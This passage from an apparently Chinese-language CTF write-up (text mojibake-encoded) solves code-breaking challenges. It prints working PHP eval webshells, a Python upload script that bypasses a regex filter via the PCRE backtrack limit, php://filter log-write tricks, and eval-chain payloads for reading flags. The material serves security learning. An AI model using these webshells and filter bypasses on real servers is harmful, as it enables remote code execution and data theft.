·åœ¨åˆ›å»ºåŒ¿åå‡½æ•°çš„åŒæ—¶ä¼šæ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„ä»£ç ï¼Œè¿™é‡Œ/* å’Œ//éƒ½æ˜¯å¯ä»¥çš„</span></span><br></pre></td></tr></table></figure><p>ç°åœ¨èƒ½å¤Ÿæ‰§è¡Œä»£ç äº†ï¼Œå‰©ä¸‹çš„å°±æ˜¯é€šè¿‡æ‰§è¡Œä»£ç å¯»æ‰¾flagã€‚è¿™é‡Œå¥—ç”¨ä¸€ä¸‹LoRexxarçš„payloadæ¥æœç´¢æ–‡ä»¶</p><p><code>http://51.158.75.42:8087/?action=%5ccreate_function&amp;arg=return%20666;}eval($_POST[%27618%27]);/*</code></p><p><code>618=$handle = opendir(&#39;../&#39;);while(($filename = readdir($handle)) !== false){echo $filename.&quot;&lt;br/&gt;&quot;;}</code></p><img src="/2019/01/10/code-breaking-esay-wp/1.png"><p>è¿™æ ·ç›´æ¥file_get_contentsè·å–å†…å®¹</p><p><code>618=print(file_get_contents(&#39;../flag_h0w2execute_arb1trary_c0de&#39;));</code></p><h2 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy - pcrewaf"></a>easy - pcrewaf</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>Â <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">Â Â Â Â <span class="keyword">return</span>Â preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>,Â $data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES))Â &#123;</span><br><span class="line">Â Â Â Â <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;$user_dirÂ =Â <span class="string">'data/'</span>Â .Â md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);$dataÂ =Â file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span>Â (is_php($data))Â &#123;</span><br><span class="line">Â Â Â Â <span class="keyword">echo</span>Â <span class="string">"badÂ request"</span>;</span><br><span class="line">&#125;Â <span class="keyword">else</span>Â &#123;</span><br><span class="line">Â Â Â Â @mkdir($user_dir,Â <span class="number">0755</span>);</span><br><span class="line">Â Â Â Â $pathÂ =Â $user_dirÂ .Â <span class="string">'/'</span>Â .Â random_int(<span class="number">0</span>,Â <span class="number">10</span>)Â .Â <span class="string">'.php'</span>;</span><br><span class="line">Â Â Â Â move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],Â $path);</span><br><span class="line">Â Â Â Â header(<span class="string">"Location:Â $path"</span>,Â <span class="keyword">true</span>,Â <span class="number">303</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œæ–‡ä»¶å†…å®¹ä¸èƒ½æœ‰<code>&lt;?</code>ï¼Œè¿™æ ·å°±æ„å‘³ç€æ­£å¸¸çš„phpæ–‡ä»¶å®Œå…¨ggï¼Œç„¶åä¹Ÿå¯ä»¥çœ‹åˆ°æ–‡ä»¶åä¸å¯æ§ï¼Œè¿™å°±æ˜¯è¯´æ²¡æœ‰åŠæ³•ç”¨æ–‡ä»¶åä¼ è¾“phpæ•°æ®ã€‚è¿™é“é¢˜å‚è€ƒäº†phå¸ˆå‚…çš„æ–¹æ³•ã€‚</p><p>phå¸ˆå‚…çš„æ–¹æ³•æ˜¯åˆ©ç”¨äº†phpæ­£åˆ™è¡¨è¾¾å¼çš„ä¸€ä¸ªç‰¹æ€§ï¼Œä¸€èˆ¬çš„è¯­è¨€åœ¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„æ—¶å€™ä¼šæœ‰å›æº¯æ“ä½œï¼Œæ¯”å¦‚åœ¨è´ªå©ªæˆ–è€…éè´ªå©ªæ¨¡å¼ä¸‹ï¼Œä¸€å¼€å§‹åŒ¹é…çš„å†…å®¹ä¼šä¸ºæœ€å¤§åŒ¹é…ï¼Œä¹‹åä¼šæ ¹æ®æ­£åˆ™è¡¨è¾¾å¼çš„å†…å®¹è¿›è¡Œå›æº¯è°ƒæ•´ã€‚ç„¶è€Œphpæœ‰ä¸€ä¸ªå›æº¯çš„æ¬¡æ•°é™åˆ¶ï¼Œå¦‚æœè¶…è¿‡è¿™ä¸ªé™åˆ¶æ­£åˆ™è¡¨è¾¾å¼å°±ä¼šè¿”å›falseï¼Œåˆç”±äºphpçš„å¼±ç±»å‹æ¯”è¾ƒï¼Œè¿™æ ·å°±ä¼šç»•è¿‡ifçš„åˆ¤æ–­ã€‚</p><p>è¿™é‡Œæœ‰é¸Ÿå“¥çš„ä¸€ç¯‡æ–‡ç« ä»‹ç»phpæ­£åˆ™åŒ¹é…çš„å›æº¯é™åˆ¶</p><p><a href="http://www.laruence.com/2010/06/08/1579.html" target="_blank" rel="noopener">http://www.laruence.com/2010/06/08/1579.html</a></p><p>phå¸ˆå‚…çš„è¯¦ç»†å†…å®¹</p><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p><p>è¿™é‡Œåœ¨ä¸Šä¼ çš„æ–‡ä»¶ä¸­åŠ å…¥1000000ä¸ªaå°±ä¼šè¶…è¿‡å›æº¯çš„æ¬¡æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requestsimport iosession = requests.session()</span><br><span class="line">agent = <span class="string">'Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM;'</span> \</span><br><span class="line"><span class="string">' Touch; NOKIA; Lumia 920)'</span></span><br><span class="line">headers = &#123;   </span><br><span class="line"><span class="string">"Host"</span>: <span class="string">"51.158.75.42:8088"</span>,    </span><br><span class="line"><span class="string">"User-Agent"</span>: agent,    </span><br><span class="line"><span class="string">"Origin"</span>: <span class="string">"https://code-breaking.com/"</span>,</span><br><span class="line">&#125;</span><br><span class="line">files = &#123; </span><br><span class="line"><span class="string">'file'</span>: io.BytesIO(<span class="string">b'aaa&lt;?php eval($_POST[txt]);//'</span> + <span class="string">b'a'</span> * <span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line">html = session.post(<span class="string">'http://51.158.75.42:8088/'</span>, headers=headers, files=files, allow_redirects=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">print</span> html.headers</span><br></pre></td></tr></table></figure><p>ç„¶åæ ¹æ®æ‰“å°å‡ºæ¥çš„å¤´éƒ¨ä¿¡æ¯ï¼Œå¾—åˆ°webshellçš„åœ°å€ <code>data/558cb3b807e236696e9e2c79295d7fee/1.php</code>ï¼Œç„¶åæ„é€ postæ•°æ®æ‰§è¡Œä»£ç ï¼Œæ‹¿flagã€‚</p><p><code>txt=$handler = opendir(&#39;../../../&#39;);while(($filename = readdir($handler)) !== flase){echo $filename.&quot;&lt;br/&gt;&quot;;}</code></p><p><code>txt=print(file_get_contents(&#39;../../../flag_php7_2_1s_c0rrect&#39;));</code></p><h2 id="easy-phpmagic"><a href="#easy-phpmagic" class="headerlink" title="easy - phpmagic"></a>easy - phpmagic</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'read-source'</span>]))Â &#123;</span><br><span class="line">Â Â Â Â <span class="keyword">exit</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;define(<span class="string">'DATA_DIR'</span>,Â dirname(<span class="keyword">__FILE__</span>)Â .Â <span class="string">'/data/'</span>Â .Â md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span><br><span class="line"><span class="keyword">if</span>(!is_dir(DATA_DIR))Â &#123;</span><br><span class="line">Â Â Â Â mkdir(DATA_DIR,Â <span class="number">0755</span>,Â <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">chdir(DATA_DIR);</span><br><span class="line">$domainÂ =Â <span class="keyword">isset</span>($_POST[<span class="string">'domain'</span>])Â ?Â $_POST[<span class="string">'domain'</span>]Â :Â <span class="string">''</span>;</span><br><span class="line">$log_nameÂ =Â <span class="keyword">isset</span>($_POST[<span class="string">'log'</span>])Â ?Â $_POST[<span class="string">'log'</span>]Â :Â date(<span class="string">'-Y-m-d'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctypeÂ html&gt;</span><br><span class="line">&lt;htmlÂ lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;Â Â Â Â </span><br><span class="line">&lt;!--Â RequiredÂ metaÂ tagsÂ --&gt;Â Â Â </span><br><span class="line">&lt;metaÂ charset=<span class="string">"utf-8"</span>&gt;Â Â Â Â </span><br><span class="line">&lt;metaÂ name=<span class="string">"viewport"</span>Â content=<span class="string">"width=device-width,Â initial-scale=1,Â shrink-to-fit=no"</span>&gt;Â Â Â Â </span><br><span class="line">&lt;!--Â BootstrapÂ CSSÂ --&gt;Â Â Â Â </span><br><span class="line">&lt;linkÂ rel=<span class="string">"stylesheet"</span>Â href=<span class="string">"https://cdn.jsdelivr.net/npm/bootstrap@4.1.3/dist/css/bootstrap.min.css"</span>Â integrity=<span class="string">"sha256-eSi1q2PG6J7g7ib17yAaWMcrr5GrtohYChqibrV7PBE="</span>Â crossorigin=<span class="string">"anonymous"</span>&gt;</span><br><span class="line">&lt;title&gt;DomainÂ Detail&lt;/title&gt;Â Â Â </span><br><span class="line">&lt;style&gt;Â Â Â Â preÂ &#123;Â Â Â Â Â Â Â Â </span><br><span class="line">width:Â <span class="number">100</span>%;Â Â Â Â Â Â Â Â </span><br><span class="line">background-color:Â <span class="comment">#f6f8fa;Â Â Â Â Â Â Â Â </span></span><br><span class="line">border-radius:Â <span class="number">3</span>px;Â Â Â Â Â Â Â Â </span><br><span class="line">font-size:Â <span class="number">85</span>%;Â Â Â Â Â Â Â </span><br><span class="line">line-height:Â <span class="number">1.45</span>;Â Â Â Â Â Â Â </span><br><span class="line">overflow:Â auto;Â Â Â Â Â Â Â </span><br><span class="line">padding:Â <span class="number">16</span>px;Â Â Â Â Â Â Â Â </span><br><span class="line">border:Â <span class="number">1</span>pxÂ solidÂ <span class="comment">#ced4da;Â Â Â Â </span></span><br><span class="line">&#125;Â Â Â Â </span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;divÂ class="container"&gt;Â Â Â Â </span><br><span class="line">&lt;divÂ class="row"&gt;Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;divÂ class="col"&gt;Â Â Â Â Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;formÂ method=<span class="string">"post"</span>&gt;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;divÂ class="input-groupÂ mt-3"&gt;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;divÂ class="input-group-prepend"&gt;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;spanÂ class="input-group-text"Â id="basic-addon1"&gt;digÂ -tÂ AÂ -q&lt;/span&gt;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;/div&gt;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;inputÂ type="text"Â name="domain"Â class="form-control"Â placeholder="YourÂ domain"&gt;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;divÂ class="input-group-append"&gt;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;buttonÂ class="btnÂ btn-outline-secondary"Â type="submit"&gt;æ‰§è¡Œ&lt;/button&gt;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;/div&gt;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;/div&gt;Â Â Â Â Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;/form&gt;Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;/div&gt;Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;/div&gt;Â Â Â </span><br><span class="line">&lt;divÂ class="row"&gt;Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;divÂ class="col"&gt;Â Â Â Â Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;preÂ class="mt-3"&gt;</span><br><span class="line"><span class="meta">&lt;?php</span>Â <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST)Â &amp;&amp;Â $domain):</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â $commandÂ =Â sprintf(<span class="string">"digÂ -tÂ AÂ -qÂ %s"</span>,Â escapeshellarg($domain));</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â $outputÂ =Â shell_exec($command);</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â $outputÂ =Â htmlspecialchars($output,Â ENT_HTML401Â |Â ENT_QUOTES);</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â $log_nameÂ =Â $_SERVER[<span class="string">'SERVER_NAME'</span>]Â .Â $log_name;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">if</span>(!in_array(pathinfo($log_name,Â PATHINFO_EXTENSION),Â [<span class="string">'php'</span>,Â <span class="string">'php3'</span>,Â <span class="string">'php4'</span>,Â <span class="string">'php5'</span>,Â <span class="string">'phtml'</span>,Â <span class="string">'pht'</span>],Â <span class="keyword">true</span>))Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â file_put_contents($log_name,Â $output);</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â $output;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">endif</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    &lt;/pre&gt;Â Â Â Â Â Â Â Â </span><br><span class="line">            &lt;/div&gt;Â Â Â </span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;/body&gt;</span><br><span class="line">            &lt;/html&gt;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆè¿˜æ˜¯æ¥çœ‹å¯æ§ç‚¹ï¼Œä¸€ä¸ªæ˜¯åŸŸåå¯æ§ï¼Œä¸€ä¸ªæ˜¯æ–‡ä»¶åéƒ¨åˆ†å¯æ§ã€‚ç„¶è€Œè¿™é‡Œæœ‰<code>escapeshellarg</code>å¯¼è‡´æˆ‘ä»¬çš„è¾“å…¥è¢«é»˜è®¤æˆå­—ç¬¦ä¸²ï¼Œæ²¡æœ‰åŠæ³•æ³¨å…¥å‘½ä»¤ï¼Œæ‰€ä»¥åªèƒ½æ‰§è¡ŒåŸŸåè§£æã€‚è¿™é‡Œå‚è€ƒfishå¸ˆå‚…çš„æ–¹æ³•ï¼Œè¿™é‡Œæœ€éœ€è¦æ³¨æ„çš„æ˜¯<code>file_get_contents</code>ï¼Œè¿™ç§æ–‡ä»¶æ“ä½œç»è¿‡blackhatçš„è®®é¢˜ï¼Œå¯ä»¥çŸ¥é“éƒ½æ˜¯å¯ä»¥æ“ä½œphpåè®®æµçš„ã€‚è€Œè¿™é‡Œæ˜¯å°†åŸŸåè§£æçš„è¾“å‡ºå†™å…¥ä¸€ä¸ªæ—¥å¿—ä¸­ï¼Œæ‰€ä»¥åŸºæœ¬æ€è·¯å°±æ˜¯åˆ©ç”¨php://filterå°†æˆ‘ä»¬çš„base64ç¼–ç çš„æ•°æ®è§£ç è¾“å…¥è¿›æ—¥å¿—æ–‡ä»¶ä¸­ã€‚</p><p>å…³äºæ–‡ä»¶åçš„åç¼€é—®é¢˜ï¼Œ<code>http://wonderkun.cc/index.html/?p=626</code> è¿™ç¯‡æ–‡ç« ä¸­çŸ¥é“åœ¨æ–‡ä»¶è·¯å¾„ä¸­åŒ…å«<code>/.</code>æˆ–è€…<code>/../</code>ä¼šå¯¼è‡´pathinfoæ— æ³•è·å–åˆ°åç¼€åï¼Œè¿™æ ·å°±ç»•è¿‡åç¼€åˆ¤æ–­ï¼Œå†™å…¥phpæ–‡ä»¶ã€‚ä¹‹åçš„é—®é¢˜åŸŸåè§£æçš„è¾“å‡ºåªæœ‰ä¸€éƒ¨åˆ†æ˜¯å¯æ§çš„ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªè¦ç‚¹å°±æ˜¯base64ä¼šå¿½è§†ä¸ç¬¦åˆè¦æ±‚çš„ç‰¹æ®Šå­—ç¬¦ï¼Œç„¶åä¼šä»¥4ä¸ªå­—ç¬¦ä¸ºä¸€ç»„è§£ç å­—ç¬¦ï¼Œæ‰€ä»¥åªè¦å‰é¢çš„æ•°æ®ä¸º4çš„å€æ•°å°±èƒ½æ­£ç¡®æ‰§è¡Œã€‚å…¶æ¬¡ç”±äºæˆ‘ä»¬çš„è¾“å…¥ç‚¹åœ¨æ•°æ®çš„ä¸­é—´éƒ¨åˆ†ï¼Œæ‰€ä»¥ä¹Ÿä¸èƒ½æœ‰<code>=</code>ç¬¦å·ã€‚</p><p>è¿™é‡Œå†™å…¥æ–‡ä»¶æœ‰ä¸€ä¸ªé‡è¦çš„ç‚¹ï¼Œé€šè¿‡ä¸Šé¢çš„è¿™ç§ç‰¹æ®Šè·¯å¾„å†™å…¥çš„æ–‡ä»¶åªèƒ½åˆ›å»ºæ–°çš„æ–‡ä»¶ï¼Œæ— æ³•è¦†ç›–åŸæ¥çš„æ—§æ–‡ä»¶ã€‚è¿™ç‚¹å¾ˆé‡è¦ï¼Œæˆ‘å°±ç™½å¿™æ´»äº†åŠä¸ªå°æ—¶â€¦â€¦</p><p>æœ€åï¼Œè¿™ä¸ªæ–‡ä»¶åå…¶ä¸­æœ‰ä¸€éƒ¨åˆ†æ˜¯server_nameï¼Œè¿™é‡Œçš„å€¼æ˜¯è·å–çš„å®¢æˆ·ç«¯è¯·æ±‚çš„hostå€¼ï¼Œå› ä¸ºåœ¨ä½¿ç”¨phpæµçš„æ—¶å€™ä¼šåŒ…å«phpï¼Œè¿™é‡Œå°±å¯ä»¥æŠŠphpæ”¾å…¥hostå€¼ä¸­ã€‚</p><img src="/2019/01/10/code-breaking-esay-wp/2.png"><p>å…¶ä¸­base64ç¼–ç ä¸‹é¢çš„webshell</p><p><code>&lt;?php @eval($_POST[&#39;618&#39;]); ?&gt;</code></p><p><code>PD9waHAgQGV2YWwoJF9QT1NUWyc2MTgnXSk7Pz4</code></p><p>æœ€åæˆ‘ä»¬åœ¨<code>http://51.158.75.42:8082/data/558cb3b807e236696e9e2c79295d7fee/x618.php</code>æ‰§è¡Œä»£ç å°±å¯ä»¥è·å–flagäº†ã€‚</p><p><code>618=var_dump(glob(&quot;/var/www/*&quot;));</code></p><p><code>618=var_dump(file_get_contents(&#39;/var/www/flag_phpmag1c_ur1&#39;));</code></p><h2 id="easy-phplimit"><a href="#easy-phplimit" class="headerlink" title="easy - phplimit"></a>easy - phplimit</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">if</span>(<span class="string">';'</span>Â ===Â preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>,Â <span class="string">''</span>,Â $_GET[<span class="string">'code'</span>]))Â &#123;Â Â Â Â </span><br><span class="line">Â Â Â Â <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125;Â <span class="keyword">else</span>Â &#123;</span><br><span class="line">Â Â Â Â show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€é“è€é¢˜ï¼Œé€šè¿‡æ­£åˆ™è¡¨è¾¾å¼æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œè¿™ä¸ªcodeåªèƒ½æ‰§è¡ŒåµŒå¥—çš„å‡½æ•°ï¼Œä¾‹å¦‚<code>abc(def())</code>è¿™ç§ï¼Œè¿™é‡Œçš„æ€è·¯å°±æ˜¯åˆ©ç”¨httpçš„headeræ¥ä¼ è¾“payloadï¼Œåˆ©ç”¨phpçš„è·å–headerçš„å‡½æ•°ï¼Œå†evalæ‰§è¡Œï¼Œå°±å˜æˆäº†ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><p><code>?code=current(getallheaders());</code></p><p>ä½†æ˜¯ï¼ŒWTFï¼Œè¿™æ˜¯nginxçš„æœåŠ¡å™¨ï¼Œæ²¡æœ‰apacheçš„ç›¸å…³å‡½æ•°ï¼Œæ‰¾äº†åŠå¤©æ— åŠŸè€Œè¿”â€¦â€¦ æ‰¾äº†æ‰¾fishå¸ˆå‚…çš„wpï¼Œä»–æ˜¯åˆ©ç”¨äº†<code>get_defined_vars</code> å‡½æ•°è·å–å®šä¹‰çš„å˜é‡ï¼Œä½†æ˜¯æœ‰å¾ˆå¤šå˜é‡æˆ‘ä»¬ä¸å¯æ§æ€ä¹ˆåŠï¼Ÿè¿™é‡Œæœ‰ä¸€ä¸ª <code>reset()</code> æ“ä½œæŠŠä¹‹å‰çš„å˜é‡å…¨éƒ¨é‡ç½®ã€‚æ‰€ä»¥å˜é‡å°±åªå‰©ä¸‹æˆ‘ä»¬ä¼ è¾“çš„getå‚æ•°ï¼Œè¿™æ ·æˆ‘ä»¬ç›´æ¥æŠŠpayloadæ”¾åœ¨getè¯·æ±‚ä¸­ï¼Œç”¨implodeå…¨éƒ¨å–å‡ºï¼Œç„¶åæ‹¼æ¥// æ³¨é‡Šæ‰åé¢çš„éƒ¨åˆ†ï¼Œåˆå˜æˆäº†ä»»æ„ä»£ç æ‰§è¡Œäº†ã€‚</p><p><code>http://51.158.75.42:8084/?1=var_dump(glob(%27/var/www/*%27));//&amp;code=eval(implode(reset(get_defined_vars())));</code></p><p>è€Œè¿™é‡Œä¸¤æ¬¡evalï¼Œç¬¬ä¸€æ¬¡evalæ˜¯æŠŠå˜é‡é‡ç½®ä¹‹åå…¨éƒ¨æå–å‡ºæ¥ï¼Œæå–å‡ºæ¥çš„å­—ç¬¦ä¸²å€¼å†æ¬¡evalï¼Œæ‰ä¼šæ‰§è¡Œæˆ‘ä»¬å‰é¢çš„ä»£ç ã€‚</p><p><code>http://51.158.75.42:8084/?1=var_dump(file_get_contents(%27/var/www/flag_phpbyp4ss%27));//&amp;code=eval(implode(reset(get_defined_vars())));</code></p><p>è¿™é‡Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–çš„payloadï¼Œéƒ½æ˜¯å¤§åŒå°å¼‚ã€‚</p><p><code>?code=eval(next(current(get_defined_vars())));&amp;b=var_dump(glob(%27/var/www/*%27));</code></p><p>å¦å¤–ä¸€ç§æ€è·¯æ˜¯åµŒå¥—ä½¿ç”¨å‡½æ•°æœç´¢ç›®å½•è¯»å–æ–‡ä»¶ã€‚</p><p><code>code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</code></p><h2 id="easy-nodechr"><a href="#easy-nodechr" class="headerlink" title="easy - nodechr"></a>easy - nodechr</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// initial libraries</span></span><br><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">'koa'</span>)</span><br><span class="line"><span class="keyword">const</span> sqlite = <span class="built_in">require</span>(<span class="string">'sqlite'</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> views = <span class="built_in">require</span>(<span class="string">'koa-views'</span>)</span><br><span class="line"><span class="keyword">const</span> Router = <span class="built_in">require</span>(<span class="string">'koa-router'</span>)</span><br><span class="line"><span class="keyword">const</span> send = <span class="built_in">require</span>(<span class="string">'koa-send'</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'koa-bodyparser'</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'koa-session'</span>)</span><br><span class="line"><span class="keyword">const</span> isString = <span class="built_in">require</span>(<span class="string">'underscore'</span>).isString</span><br><span class="line"><span class="keyword">const</span> basename = <span class="built_in">require</span>(<span class="string">'path'</span>).basename</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> config = <span 